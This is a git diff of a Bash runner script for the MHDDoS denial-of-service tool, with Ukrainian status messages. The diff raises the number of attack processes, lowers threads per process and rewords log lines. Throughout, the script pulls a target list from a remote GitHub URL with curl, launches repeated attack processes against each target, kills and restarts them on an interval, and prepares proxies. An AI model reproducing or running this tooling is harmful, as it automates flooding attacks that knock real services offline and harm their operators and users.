@@ -31,9 +31,9 @@ fi
 eval set -- "$PARSED"
 
 refresh_interval="15m"
-thread_count="1000"
-process_count="5"
-stats_interval="30"
+thread_count="250"
+process_count="20"
+stats_interval="60"
 url_with_targets="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
 
 # now enjoy the options in order and nicely split until we see --
@@ -111,7 +111,7 @@ do
     if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
     if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
     if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
-    echo "DDoS (ре)стартує. Завершення попередніх процесів... ГОТОВО!"
+    echo "(ре)старт DDoS завершено"
 
     # delete old proxy file if present
     if [ -f $PROXY_FILE ]; then
@@ -120,7 +120,7 @@ do
 
     # load targets and process them one-by-one
     curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
-      echo "Запускаємо $process_count процесів для атаки $target_command -t $thread_count -p 25200 --rpc 1000"
+      echo "Запускаємо $process_count процесів для атаки $target_command, з $thread_count потоками"
 
       for (( i=1; i<=process_count; i++ ))
       do
@@ -136,7 +136,7 @@ do
                   sleep 1
               done
 
-              echo "Підготовка та перевірка проксі. Це може зайняти декілька хвилин... ГОТОВО!"
+              echo "Підготовку на перевірку проксі завершено"
           fi
       done
   done
